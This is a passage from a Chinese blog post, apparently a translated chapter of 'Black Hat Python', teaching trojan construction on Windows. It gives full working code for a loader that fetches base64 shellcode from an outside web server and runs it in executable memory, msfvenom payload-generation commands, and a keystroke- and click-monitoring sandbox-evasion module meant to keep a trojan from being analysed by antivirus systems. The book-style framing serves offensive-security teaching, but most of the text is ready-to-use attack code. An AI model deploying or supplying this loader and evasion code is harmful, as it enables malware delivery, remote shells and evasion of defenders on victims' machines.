<p>这个脚本很容易测试：只需从命令行运行它，并检查您的目录下的 <em>screenshot.bmp</em> 文件。您也可以将这个脚本包含在您的 GitHub 命令和控制存储库(笔者注：参照前几章)中，因为在 <em>run</em> 函数[8]调用了 <em>screenshot</em> 函数来创建图像，然后读取并返回文件数据。</p>
<p>下一步让我们继续来执行 shellcode 。</p>
<h2 id="Pythonic-Shellcode-实现"><a href="#Pythonic-Shellcode-实现" class="headerlink" title="Pythonic Shellcode 实现"></a>Pythonic Shellcode 实现</h2><p>(笔者注：Pythonic，符合Python风格，优雅的、地道的、整洁的，可以了解一下“the zen of python”)</p>
<p>可能有一天，您希望能够与您的目标机器之一进行交互，或者使用您最喜欢的渗透测试或漏洞利用框架中有趣的新漏洞利用模块。这通常(尽管不总是)需要某种形式的 shellcode 来实现。为了在不接触文件系统的情况下执行原始 shellcode ，我们需要在内存中创建一个缓冲区来保存 shellcode ，并使用 <em>ctypes</em> 模块创建一个指向该内存的函数指针。然后我们再调用函数。</p>
<p>在我们的例子中，我们将使用 <em>urllib</em> 从 web 服务器获取 base64 格式的 shellcode ，然后执行它。让我们开始吧！打开 <em>shell_exec.py</em> 并输入以下代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">kernel32 = ctypes.windll.kernel32</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">(url)</span>:</span></span><br><span class="line">[<span class="number">1</span>] <span class="keyword">with</span> request.urlopen(url) <span class="keyword">as</span> response:</span><br><span class="line">        shellcode =  base64.decodebytes(response.read())</span><br><span class="line">    <span class="keyword">return</span> shellcode</span><br><span class="line">[<span class="number">2</span>] <span class="function"><span class="keyword">def</span> <span class="title">write_memory</span><span class="params">(buf)</span>:</span></span><br><span class="line">    length = len(buf)</span><br><span class="line">    kernel32.VirtualAlloc.restype = ctypes.c_void_p</span><br><span class="line">[<span class="number">3</span>] kernel32.RtlMoveMemory.argtypes = (</span><br><span class="line">    ctypes.c_void_p,</span><br><span class="line">    ctypes.c_void_p,</span><br><span class="line">    ctypes.c_size_t)</span><br><span class="line"> [<span class="number">4</span>] ptr = kernel32.VirtualAlloc(<span class="literal">None</span>, length, <span class="number">0x3000</span>, <span class="number">0x40</span>)</span><br><span class="line">    kernel32.RtlMoveMemory(ptr, buf, length)</span><br><span class="line">    <span class="keyword">return</span> ptr</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(shellcode)</span>:</span></span><br><span class="line">[<span class="number">5</span>] buffer = ctypes.create_string_buffer(shellcode)</span><br><span class="line">    ptr = write_memory(buffer)</span><br><span class="line">[<span class="number">6</span>] shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(<span class="literal">None</span>))</span><br><span class="line">[<span class="number">7</span>] shell_func()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    url = <span class="string">"http://192.168.1.203:8100/shellcode.bin"</span></span><br><span class="line">    shellcode = get_code(url)</span><br><span class="line">    run(shellcode)</span><br></pre></td></tr></table></figure>

<p>我们通过调用 <em>get_code</em> 函数从 web 服务器中检索 base64 编码的 shellcode 来开始我们的主要模块[1]。然后我们调用 <em>run</em> 函数将 shellcode 写入内存并执行。</p>
<p>在 <em>run</em> 函数中，我们分配了一个缓冲区[5]来保存解码后的 shellcode 。接下来，我们调用 <em>write_memory</em> 函数将缓冲区写入内存[2]。</p>
<p>为了能够写入内存，我们必须分配我们需要的内存 ( <em>VirtualAlloc</em> ) ，然后将包含 shellcode 的缓冲区移动到分配的内存 ( <em>RtlMoveMemory</em> ) 中。为了确保无论我们使用32位还是64位 Python ， shellcode 都可以运行，我们必须指定我们想要从 <em>VirtualAlloc</em> 返回的结果是一个指针，并且我们将给 <em>RtlMoveMemory</em> 函数的参数是两个指针和一个大小对象。我们通过设置 <em>VirtualAlloc.restype</em> 和 <em>RtlMoveMemory.argtypes</em> [3]来实现这一点。如果没有这一步，从 <em>VirtualAlloc</em> 返回的内存地址的宽度将与 <em>RtlMoveMemory</em> 期望的宽度不匹配。</p>
<p>在对 <em>VirtualAlloc</em> 的调用中[4]，0x40参数指定内存应该设置为具有执行和读/写访问的权限；否则，我们将无法编写和执行 shellcode 。然后，我们将缓冲区移动到分配的内存中，并返回指向缓冲区的指针。回到 <em>run</em> 函数中， <em>ctypes.cast</em> 函数允许我们将缓冲区像函数指针一样执行[6]，这样我们就可以像调用任何标准的 Python 函数一样调用 shellcode 。我们通过调用函数指针来完成它，然后让 shellcode 执行[7]。</p>
<h3 id="Kicking-the-Tires-1"><a href="#Kicking-the-Tires-1" class="headerlink" title="Kicking the Tires"></a>Kicking the Tires</h3><p>您可以手工编写一些 shellcode ，或者使用您最喜欢的渗透测试框架(如 CANVAS 或 Metasploit )来为您生成它。因为 CANVAS 是一个商业工具，所以来看看这个生成 Metasploit payload 的辅助教程: <a href="http://www.offensive-security.com/metasploit-unleashed/Generating_Payloads/" target="_blank" rel="noopener">http://www.offensive-security.com/metasploit-unleashed/Generating_Payloads/</a>。我们用 Metasploit payload 生成器(在我们的例子中是 <em>msfvenom</em> )挑选了一些 Windows x86 的 shellcode 。在您的 Linux 机器上的 /tmp/shellcode.raw 中创建原始的 shellcode ，如下所示:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/<span class="built_in">exec</span> -e x86/shikata_ga_nai -i 1 -f raw cmd=calc.exe &gt; shellcode.raw</span><br><span class="line">$ base64 -w 0 -i shellcode.raw &gt; shellcode.bin</span><br><span class="line">$ python -m http.server 8100</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8100 ...</span><br></pre></td></tr></table></figure>

<p>我们用 <em>msfvenom</em> 创建 shellcode ，然后使用标准的 Linux 命令 <code>base64</code> 对其进行 base64 编码。下一个小技巧是使用 <em>http.server</em> 模块将当前工作目录(在我们的例子中是 /tmp/ )作为其 web 根目录。对端口8100上的任何对文件的 HTTP 请求将自动为您服务。现在把你的 <em>shell_exec.py</em> 脚本放到你的 Windows 机器上，然后运行它。您应该会在您的 Linux 终端中看到以下内容:</p>
<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">192</span>.<span class="number">168</span>.<span class="number">112</span>.<span class="number">130</span> - - [<span class="number">12</span>/Jan/<span class="number">2014</span> <span class="number">21</span>:<span class="number">36</span>:<span class="number">30</span>] "GET /shellcode.bin HTTP/<span class="number">1</span>.<span class="number">1</span>" <span class="number">200</span> -</span><br></pre></td></tr></table></figure>

<p>这表明您的脚本已经从使用 <em>http.server</em> 模块设置的 web 服务器中检索到了 shellcode 。如果一切顺利，您将收到一个反弹到您的框架的 shell ，并且已经弹出了 calc.exe ，获得了一个反向 TCP shell ，显示了一个消息框，或者编译了您的 shell 代码。</p>
<h2 id="Sandbox-Detection–沙箱检测"><a href="#Sandbox-Detection–沙箱检测" class="headerlink" title="Sandbox Detection–沙箱检测"></a>Sandbox Detection–沙箱检测</h2><p>反病毒解决方案越来越多地采用某些形式的沙箱来确定可疑样本的行为。不管这个沙箱是越来越流行在网络边界运行，还是在目标机器本身上运行，我们都必须尽最大努力避免让目标网络上的任何防御措施得逞。</p>
<p>我们可以使用一些指示器来尝试确定我们的特洛伊木马是否在沙箱中执行。我们将监控目标机器最近的用户输入。然后我们将添加一些基本的智能功能来查找键盘按键、鼠标点击和双击情况。一台典型的机器在启动的当天有许多用户交互，而沙箱环境通常没有用户交互，因为沙箱通常被用作自动恶意软件分析技术。</p>
<p>我们的脚本还将尝试确定沙箱的“操作者”是否在重复发送输入(例如，可疑的、快速的连续鼠标点击)来响应并欺骗基本的沙箱检测方法。最后，我们将比较用户最后一次与机器交互的时间和机器已经运行了多长时间，这应该会让我们很好地知道我们是否在沙箱中。</p>
<p>然后，我们可以决定是否继续执行。让我们开始研究一些沙箱检测代码。打开 <em>sandbox_detect.py</em> 并输入以下代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> byref, c_uint, c_ulong, sizeof, Structure, windll</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> win32api</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LASTINPUTINFO</span><span class="params">(Structure)</span>:</span></span><br><span class="line">    fields_ = [</span><br><span class="line">        (<span class="string">'cbSize'</span>, c_uint),</span><br><span class="line">        (<span class="string">'dwTime'</span>, c_ulong)</span><br><span class="line">    ]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_last_input</span><span class="params">()</span>:</span></span><br><span class="line">    struct_lastinputinfo = LASTINPUTINFO()</span><br><span class="line">[<span class="number">1</span>] struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO)</span><br><span class="line">    windll.user32.GetLastInputInfo(byref(struct_lastinputinfo))</span><br><span class="line">[<span class="number">2</span>] run_time = windll.kernel32.GetTickCount()</span><br><span class="line">    elapsed = run_time - struct_lastinputinfo.dwTime</span><br><span class="line">    print(<span class="string">f"[*] It's been <span class="subst">&#123;elapsed&#125;</span> milliseconds since the last event."</span>)</span><br><span class="line">    <span class="keyword">return</span> elapsed</span><br><span class="line">[<span class="number">3</span>] <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    get_last_input()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>我们定义必要的导入，并创建一个 <em>LASTINPUTINFO</em> 结构，该结构将保存系统上最后一次检测到输入事件的时间戳(以毫秒为单位)。接下来，我们创建一个函数 <em>get_last_input</em> 来确定输入的最后时间。请注意，在进行调用之前，您必须将 cbSize [1]变量初始化为结构的大小。然后我们调用 <em>GetLastInputInfo</em> 函数，该函数用时间戳填充 <em>struct_lastinputinfo.dwTime</em> 字段。下一步是通过调用 <em>GetTickCount</em> [2]函数来确定系统已经运行了多长时间。经过的时间是机器运行的总时间减去最后一次输入的时间。代码的最后一个小片段[3]是简单的测试代码，您可以运行脚本，然后移动鼠标或者按键盘上的一个键，就可以看到这段新代码正在运行的情况。</p>
<p>值得注意的是，总运行系统时间和最后检测到的用户输入事件可能会因您的具体植入方法而异。例如，如果您使用网络钓鱼策略植入了 payload ，用户很可能必须点击链接或执行其他操作来被感染。这意味着在最后一两分钟内，您将看到用户输入。但是，如果您看到机器已经运行了10分钟，并且最后一次检测到的输入是在10分钟前，那么您很可能在一个没有处理任何用户输入的沙箱中。这些判断的使用都是完成一个优秀的、可持续工作的木马的一部分。</p>
<p>您可以在轮询系统以查看用户是否空闲时使用同样的技术，因为您可能希望仅在用户积极持续使用机器时进行截图。同样，您可能希望仅在用户可能下线时传输数据或执行其他任务。例如，您还可以跟踪一段时间内的用户，以确定他们通常在线的日期和时间。</p>
<p>记住这一点，让我们定义三个阈值，在确定我们不再处于沙箱中之前，我们必须检测这些用户输入值中的多少。删除最后三行测试代码，并添加一些额外的代码来查看键盘击键和鼠标点击情况。这次我们将使用纯 <em>ctypes</em> 解决方案，而不是 <em>PyWinHook</em> 函数。您也可以很容易地使用 <em>PyWinHook</em> 来实现该目的，但是在您的工具箱中有几个不同的技巧方法总是有帮助的，因为每个防病毒和沙盒技术都有自己发现这些技巧的方法。让我们开始编码吧:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Detector</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.double_clicks = <span class="number">0</span></span><br><span class="line">        self.keystrokes = <span class="number">0</span></span><br><span class="line">        self.mouse_clicks = <span class="number">0</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_key_press</span><span class="params">(self)</span>:</span></span><br><span class="line">    [<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">0xff</span>):</span><br><span class="line">        [<span class="number">2</span>] state = win32api.GetAsyncKeyState(i)</span><br><span class="line">            <span class="keyword">if</span> state &amp; <span class="number">0x0001</span>:</span><br><span class="line">            [<span class="number">3</span>] <span class="keyword">if</span> i == <span class="number">0x1</span>:</span><br><span class="line">                    self.mouse_clicks += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">return</span> time.time()</span><br><span class="line">            [<span class="number">4</span>] <span class="keyword">elif</span> i &gt; <span class="number">32</span> <span class="keyword">and</span> i &lt; <span class="number">127</span>:</span><br><span class="line">                    self.keystrokes += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br></pre></td></tr></table></figure>

<p>我们创建一个 <em>Detector</em> 类，并将点击和击键初始化为零。<em>get_key_press</em> 类函数告诉我们鼠标点击的次数、鼠标点击的时间以及目标发出的击键次数。它是通过迭代有效输入键的范围来生效[1]；对于每个键，我们使用 <em>GetAsyncKeyState</em> [2]函数调用来检查它是否被按下。如果键的状态显示它被按下( state &amp; 0x0001 的结果是真 )，我们检查它的值是否是0x1 [3]，这是鼠标左键点击的虚拟键代码。我们增加鼠标点击的总次数，并返回当前的时间戳，以便我们稍后可以执行计时计算。我们还会检查键盘上是否有 ASCII 按键[4]，如果有，只需增加检测到的按键总数。</p>
<p>现在让我们将这些函数的结果合并到我们的主沙箱检测循环中。向 <em>sandbox_detect.py</em> 添加以下函数:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detect</span><span class="params">(self)</span>:</span></span><br><span class="line">        previous_timestamp = <span class="literal">None</span></span><br><span class="line">        first_double_click = <span class="literal">None</span></span><br><span class="line">        double_click_threshold = <span class="number">0.35</span></span><br><span class="line">    [<span class="number">1</span>] max_double_clicks = <span class="number">10</span></span><br><span class="line">        max_keystrokes = random.randint(<span class="number">10</span>,<span class="number">25</span>)</span><br><span class="line">        max_mouse_clicks = random.randint(<span class="number">5</span>,<span class="number">25</span>)</span><br><span class="line">        max_input_threshold = <span class="number">30000</span></span><br><span class="line">    [<span class="number">2</span>] last_input = get_last_input()</span><br><span class="line">        <span class="keyword">if</span> last_input &gt;= max_input_threshold:</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        detection_complete = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> detection_complete:</span><br><span class="line">        [<span class="number">3</span>] keypress_time = self.get_key_press()</span><br><span class="line">            <span class="keyword">if</span> keypress_time <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> previous_timestamp <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            [<span class="number">4</span>] elapsed = keypress_time - previous_timestamp</span><br><span class="line">            [<span class="number">5</span>] <span class="keyword">if</span> elapsed &lt;= double_click_threshold:</span><br><span class="line">                    self.mouse_clicks -= <span class="number">2</span></span><br><span class="line">                    self.double_clicks += <span class="number">1</span></span><br><span class="line">                    <span class="keyword">if</span> first_double_click <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                        first_double_click = time.time()</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                    [<span class="number">6</span>] <span class="keyword">if</span> self.double_clicks &gt;= max_double_clicks:</span><br><span class="line">                        [<span class="number">7</span>] <span class="keyword">if</span> (keypress_time - first_double_click &lt;=</span><br><span class="line">                                (max_double_clicks*double_click_threshold)):</span><br><span class="line">                                sys.exit(<span class="number">0</span>)</span><br><span class="line">            [<span class="number">8</span>] <span class="keyword">if</span> (self.keystrokes &gt;= max_keystrokes <span class="keyword">and</span></span><br><span class="line">                    self.double_clicks &gt;= max_double_clicks <span class="keyword">and</span></span><br><span class="line">                    self.mouse_clicks &gt;= max_mouse_clicks):</span><br><span class="line">                    detection_complete = <span class="literal">True</span></span><br><span class="line">                previous_timestamp = keypress_time</span><br><span class="line">            <span class="keyword">elif</span> keypress_time <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                previous_timestamp = keypress_time</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    d = Detector()</span><br><span class="line">    d.detect()</span><br><span class="line">    print(<span class="string">'okay.'</span>)</span><br></pre></td></tr></table></figure>

<p>好吧。请注意这些代码块中的缩进！我们首先定义了一些变量[1]来跟踪鼠标点击的时间，并定义了三个阈值，分别是我们关注的按键次数、鼠标点击次数或双击的次数，这些都是在确定自己是在沙箱之外运行之前完成。我们在每次运行时都会随机化这些阈值，但是您当然可以根据自己的测试情况设置自己的阈值。</p>
<p>然后，我们检索自某种形式的用户输入在系统上注册以来经过的时间[2]，如果我们觉得已经很久没有看到输入了(基于感染目标是如何作用的，如前所述)，我们就退出，特洛伊木马就会“死亡”。这时您的特洛伊木马不会死在这里，而是可以执行一些无害的活动，例如读取随机注册表项或检查文件。在我们通过这个初始检查之后，我们继续我们基本的按键和鼠标点击检测循环。</p>
<p>我们首先检查按键或鼠标点击[3]，并且知道如果函数返回了一个值，该值是发生按键或鼠标点击的时间戳。接下来，我们计算鼠标点击之间经过的时间[4]，然后将其与我们的阈值进行比较[5]，以确定这是否是双击。除了双击检测之外，我们还在检测沙箱操作者是否已经将点击事件[6]的流传输到沙箱中，试图欺骗沙箱检测技术。例如，在正常的计算机使用过程中，连续看到100次双击会很奇怪。如果已经达到双击的最大次数，并且它们连续快速发生[7]，我们就退出程序。我们的最后一步是看一下我们是否通过了所有的检查，并达到了我们设置的最大点击次数，按键次数和双击次数[8]；如果是这样的话，我们就退出我们的沙盒检测功能(笔者注：看代码可以知道这个时候就退出检测循环了)。</p>
<p>我们鼓励您调整和使用设置，并添加额外的功能，如虚拟机检测。统计你拥有的几台电脑(我们指的是你自己实际拥有的电脑，而不是你入侵控制的电脑)上鼠标点击、双击和按键的典型用法可能是值得的，看看你觉得巧妙的地方在哪里。根据您的目标，您可能想要更针对性的设置，或者您可能根本不关心沙盒检测。</p>
<p>您在本章中开发的工具可以作为在您设计实现的特洛伊木马中功能的基础层，并且由于我们的木马框架的模块化，您可以选择部署其中的任何一个。</p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ma9icCR</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-8/">https://ma9iccr.github.io/2021-07/Black-Hat-Python-2nd-8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ma9iccr.github.io" target="_blank">Ma9icCR</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Black-Hat-Python-2nd/">Black_Hat_Python_2nd</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021-07/Black-Hat-Python-2nd-9/"><img class="prev-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Black Hat Python 2nd 9</div></div></a></div><div class="next-post pull-right"><a href="/2021-07/Black-Hat-Python-2nd-7/"><img class="next-cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Black Hat Python 2nd 7</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-11/" title="Black Hat Python 2nd 11"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-23</div><div class="relatedPosts_title">Black Hat Python 2nd 11</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-10/" title="Black Hat Python 2nd 10"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-20</div><div class="relatedPosts_title">Black Hat Python 2nd 10</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-9/" title="Black Hat Python 2nd 9"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-18</div><div class="relatedPosts_title">Black Hat Python 2nd 9</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-7/" title="Black Hat Python 2nd 7"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-08</div><div class="relatedPosts_title">Black Hat Python 2nd 7</div></div></a></div><div class="relatedPosts_item"><a href="/2021-07/Black-Hat-Python-2nd-6/" title="Black Hat Python 2nd 6"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-07-03</div><div class="relatedPosts_title">Black Hat Python 2nd 6</div></div></a></div><div class="relatedPosts_item"><a href="/2021-06/Black-Hat-Python-2nd-5/" title="Black Hat Python 2nd 5"><img class="relatedPosts_cover" data-src="https://ma9ic-image.obs.cn-north-4.myhuaweicloud.com/images/BHP2nd.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-28</div><div class="relatedPosts_title">Black Hat Python 2nd 5</div></div></a></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Ma9icCR</div><div class="framework-info"><span>驱动 </span><a href="https://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font_plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font_minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">简</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script id="ribbon_piao" mobile="false" src="/js/third-party/piao.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script></body></html>